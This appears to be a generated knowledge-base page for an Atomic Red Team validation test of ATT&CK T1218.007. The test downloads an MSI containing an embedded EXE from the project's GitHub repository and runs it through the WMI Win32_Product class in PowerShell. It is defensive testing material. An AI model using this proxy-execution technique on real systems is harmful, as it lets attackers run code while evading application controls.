---
atomic_guid: "55080eb0-49ae-4f55-a440-4167b7974f79"
title: "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.007"
attack_technique_name: "Signed Binary Proxy Execution: Msiexec"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "55080eb0-49ae-4f55-a440-4167b7974f79"
  - "WMI Win32_Product Class - Execute Local MSI file with an embedded EXE"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WMI Win32_Product Class - Execute Local MSI file with an embedded EXE

Executes an MSI containing an embedded EXE using the WMI Win32_Product class

## Metadata

- Atomic GUID: 55080eb0-49ae-4f55-a440-4167b7974f79
- Technique: T1218.007: Signed Binary Proxy Execution: Msiexec
- Platforms: windows
- Executor: powershell
- Dependency Executor: powershell
- Source Path: atomics/T1218.007/T1218.007.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.007]]

## Input Arguments

### action

- description: Specifies the MSI action to perform: Install, Admin, Advertise. The included MSI is designed to support all three action types.

- type: string
- default: Install

### msi_payload

- description: MSI file to execute
- type: path
- default: PathToAtomicsFolder\T1218.007\bin\T1218.007_EXE.msi

## Dependencies

The MSI file must exist on disk at specified location (#{msi_payload})

### Prerequisite Check

```text
if (Test-Path "#{msi_payload}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory (split-path "#{msi_payload}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_EXE.msi" -OutFile "#{msi_payload}"
```

## Executor

- name: powershell

### Command

```powershell
Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.007/T1218.007.yaml)
